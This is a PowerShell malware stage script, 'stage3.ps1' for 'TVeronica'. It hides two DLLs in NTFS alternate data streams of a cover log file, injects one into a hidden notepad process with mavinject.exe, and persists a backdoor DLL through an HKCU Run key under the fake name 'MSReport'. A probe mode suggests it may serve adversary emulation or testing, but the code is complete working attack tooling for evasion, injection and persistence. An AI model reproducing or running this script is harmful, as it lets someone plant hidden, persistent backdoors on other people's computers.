# stage3.ps1 - TVeronica Stage 3+4: STAGING (NTFS ADS) + INJECTION (mavinject) + PERSISTENCE
#
#   1. ensure target process (default notepad.exe - started HIDDEN if not running)
#   2. stage inject.dll + backdoor.dll into NTFS ADS:  report.log:inject.dll / report.log:backdoor.dll
#      NOTE: System.IO.File APIs REJECT ADS paths (NotSupportedException) -> use PowerShell
#      FileSystem provider (Set-Content -Encoding Byte) and VERIFY every stream after write.
#   3. mavinject.exe <PID> /INJECTRUNNING <report.log:inject.dll>
#   4. persist: HKCU Run -> rundll32.exe "report.log:backdoor.dll",Start
#
# Exit codes: 0 = ok | 1 = missing payload | 2 = no target process | 3 = ADS staging failed
# -Probe drops %TEMP%\tveronica_probe first (real DLLs write a marker and exit instead of C2 loop)

param(
    [string]$StageDir,
    [string]$TargetName = 'notepad.exe',
    [int]$TargetPid = 0,
    [switch]$Probe
)

$ErrorActionPreference = 'SilentlyContinue'

# ---------------- report.log host (ADS carrier + cover file) ----------------
$repDir = Join-Path $env:APPDATA 'MSReport'
if (-not (Test-Path $repDir)) { New-Item -ItemType Directory -Path $repDir -Force | Out-Null }
$repLog = Join-Path $repDir 'report.log'
if (-not (Test-Path $repLog)) { Set-Content -Path $repLog -Value 'MSReport - session notes' }
Add-Content -Path $repLog -Value ('[{0}] report start' -f (Get-Date -Format 's'))

if (-not $StageDir) { $StageDir = Split-Path -Parent $MyInvocation.MyCommand.Path }

function Log([string]$m) {
    Write-Host $m
    Add-Content -Path $repLog -Value $m
}

function Write-Ads {
    param([string]$File, [string]$Stream, [byte[]]$Bytes)
    $dst = '{0}:{1}' -f $File, $Stream
    try {
        Set-Content -Path $dst -Value $Bytes -Encoding Byte -ErrorAction Stop
    } catch {
        return $false
    }
    $chk = Get-Item $File -Force -Stream $Stream -ErrorAction SilentlyContinue
    return ($null -ne $chk -and $chk.Length -gt 0)
}

if ($Probe) {
    Set-Content -Path (Join-Path $env:TEMP 'tveronica_probe') -Value '1'
    Log '[*] probe mode: DLLs will write markers and exit'
}

# ---------------- Stage 3a: NTFS ADS staging (verified) ----------------
foreach ($dll in @('inject.dll', 'backdoor.dll')) {
    $src = Join-Path $StageDir $dll
    if (-not (Test-Path $src)) { Log "[!] missing payload: $src"; exit 1 }
    $bytes = [IO.File]::ReadAllBytes($src)
    if (Write-Ads -File $repLog -Stream $dll -Bytes $bytes) {
        Log ('[+] staged {0} -> report.log:{0} (stream verified, {1} bytes)' -f $dll, $bytes.Length)
    } else {
        Log ('[!] ADS staging FAILED for {0}' -f $dll)
        exit 3
    }
}
attrib +h $repLog | Out-Null

# ---------------- Stage 3b: ensure target + mavinject ----------------
$procName = $TargetName -replace '\.exe$', ''
if (-not $TargetPid) {
    $p = Get-Process -Name $procName -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $p) {
        Log ('[*] {0} not running - starting hidden' -f $TargetName)
        Start-Process -FilePath $TargetName -WindowStyle Hidden
        Start-Sleep 2
        $p = Get-Process -Name $procName -ErrorAction SilentlyContinue | Select-Object -First 1
    }
    if (-not $p) { Log "[!] target '$TargetName' unavailable"; exit 2 }
    $TargetPid = $p.Id
}
Log ('[+] target pid {0} ({1})' -f $TargetPid, $TargetName)

$mav = Join-Path $env:SystemRoot 'System32\mavinject.exe'
$adsDll = '{0}:inject.dll' -f $repLog
$out = & $mav $TargetPid /INJECTRUNNING $adsDll 2>&1
Log ('[+] mavinject rc={0} out={1}' -f $LASTEXITCODE, (($out | Out-String).Trim()))

if ($Probe) {
    Start-Sleep 2
    $mk = Join-Path $env:TEMP 'tver_inject_ok.txt'
    if (Test-Path $mk) {
        Log ('[+] probe marker: {0}' -f ((Get-Content $mk) -join ' '))
    } else {
        Log '[!] probe marker MISSING (DLL did not load in target)'
    }
}

# ---------------- Stage 4: persistence ----------------
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$rundllCmd = 'rundll32.exe "{0}:backdoor.dll",Start' -f $repLog
New-ItemProperty -Path $runKey -Name 'MSReport' -Value $rundllCmd -PropertyType String -Force | Out-Null
Log ('[+] persistence set: MSReport -> {0}' -f $rundllCmd)

Log '[+] stage3+4 complete (ADS staged, injection fired, persistence set)'
exit 0
